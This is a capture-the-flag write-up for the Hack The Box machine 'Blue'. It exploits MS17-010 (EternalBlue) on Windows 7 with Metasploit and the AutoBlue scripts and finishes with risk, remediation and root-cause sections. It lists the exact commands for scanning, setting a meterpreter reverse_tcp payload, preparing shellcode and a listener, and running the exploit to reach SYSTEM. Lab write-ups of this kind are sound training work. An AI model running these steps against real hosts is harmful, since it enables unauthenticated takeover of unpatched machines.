Machine name : Blue
Platform : Hackthebox
difficulty : easy 
target IP : 10.10.10.40
OS : Windows 7 Professional 7601 Service Pack 1 Microsoft 

**Objective :** Assess the target for the MS17-010 (EternalBlue) SMB vulnerability and determine whether it can be exploited to obtain remote SYSTEM-level access.
### Open Ports : 

| Port | State | Service      | Version                                       |
| ---- | ----- | ------------ | --------------------------------------------- |
| 135  | open  | msrpc        | Microsoft Windows RPC                         |
| 139  | open  | netbios-ssn  | Microsoft Windows netbios-ssn                 |
| 445  | open  | microsoft-ds | Windows 7 Professional 7601 Service Pack 1 MS |
### Enumeration :
**nmap:**
![[Pasted image 20260715181753.png]]

Nmap identified ports 135, 139, and 445. Host was running Windows 7 Professional SP1, suggesting it could be vulnerable to the MS17-010 (EternalBlue) vulnerability.

**Metasploit :** 
- Run metasploit `msfconsole`:
```
search ms17-010
```
- Select the auxiliary scanner for smb :
```
auxiliary/scanner/smb/smb_ms17_010
```
![[Pasted image 20260713222422.png|285]]
- Set an rhost :
```
set rhosts 10.10.10.40
```
![[Pasted image 20260713222858.png|697]]
- Now run, and it returns (Host is likely VULNERABLE to MS17-010!) 
![[Pasted image 20260713223111.png|697]]

### Exploitation : 
- Select exploit for eternal_blue in metasploit :
```
exploit/windows/smb/ms17_010_eternalbule
```
![[Pasted image 20260713233048.png]]
 - set the rhost.
 - check for the exploits target.
 ```
 show targets
 ```
 - run the exploit with `run or exploit`.
 ![[Pasted image 20260714154350.png]]
 
- got access to the shell session :
![[Pasted image 20260714154422.png]]
- terminate this session.

- now try to use a staged payload : (just for testing)
```
set payload windows/x64/meterpreter/reverse_tcp
```
![[Pasted image 20260714163324.png]]

-  **got access to the shell again** :
![[Pasted image 20260714163740.png|392]]

Now use the **autoblue** exploit : get it at (https://github.com/3ndG4me/AutoBlue-MS17-010/tree/master).

- install using the git clone :
```
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
```
-  got to its directory , and run eternalblue_checker.py
```
python eternalblue_checker.py {targets ip}
```
Output : the target is not patched 
![[Pasted image 20260714183113.png|531]]
which mean it is vulnerable to this exploit.

- now got to the shellcode directory `cd shellcode`. 
- run : `./shell_prep.sh`
![[Pasted image 20260714183740.png|569]]

- generating  a meterpreter shell using a staged payload. (select 0 for that )
![[Pasted image 20260714184007.png]]

**Now generate a listener :**
- change the directory to the `./listener_prep.sh`
again set the RHOST and LPORT:
![[Pasted image 20260714184323.png]]

- This will start a exploit handler (ie metasploit):
![[Pasted image 20260714184535.png]]

![[Pasted image 20260714184705.png]]

- now i another terminal run the `eternalblue_exploit7.py`.
```
pyhton eternalblue_exploit7.py 10.10.10.40 shellcode/sc_all.bin
```

- change back to the previous terminal : 
![[Pasted image 20260714185132.png]]
got **access** to a sessions.
- search sessions and selected a session :
![[Pasted image 20260714191236.png]]

### Risk analysis :
**Severity : critical**
>reason : The target is vulnerable to MS17-010 (EternalBlue), allowing unauthenticated remote code execution over SMB. Successful exploitation results in SYSTEM-level privileges without requiring valid credentials.

**Impact :**
Successful exploitation allows a remote attacker to execute arbitrary code with **NT AUTHORITY\SYSTEM** privileges. An attacker could:

- Execute arbitrary commands on the system.
- Read sensitive files and confidential data.
- Modify or delete system and user files.
- Create new administrator accounts.
- Install malware, ransomware, or persistent backdoors.
- Dump password hashes and credentials from memory (depending on system protections).
- Disable security software or Windows Defender.
- Use the compromised host as a pivot point to attack other systems on the internal network.

This vulnerability can result in **complete compromise of the affected host**. Once SYSTEM access is obtained, the attacker effectively has full control over the operating system.

### Remediation :
- Apply Microsoft's MS17-010 security update.
- Disable SMBv1 if it is not required.
- Restrict SMB (TCP/445) access using firewalls or network segmentation.
- Keep Windows systems fully patched.
- Monitor SMB traffic for suspicious activity.
- Implement endpoint detection and response (EDR) solutions.

# Root Cause

> The system was running an unpatched version of Windows 7 that remained vulnerable to the MS17-010 (EternalBlue) SMB vulnerability. SMB was exposed on TCP port 445, allowing remote exploitation without authentication.

# Evidence

- Nmap identifying SMB services on port 139 , 445.
- MS17-010 scanner reporting the host as vulnerable.
- Successful Meterpreter session established.
- `getuid` confirms `NT AUTHORITY\SYSTEM`privileges.

### Conclusion : 
>The system was successfully compromised due to an unpatched Windows 7 operating system vulnerable to the **MS17-010 (EternalBlue)** SMB vulnerability. By exploiting the SMB service exposed on **TCP port 445**, an attacker was able to achieve **remote code execution** and obtain **NT AUTHORITY\SYSTEM** privileges **without requiring authentication**. This resulted in complete compromise of the target machine, allowing the attacker to execute arbitrary commands, access sensitive data, and maintain full control over the system.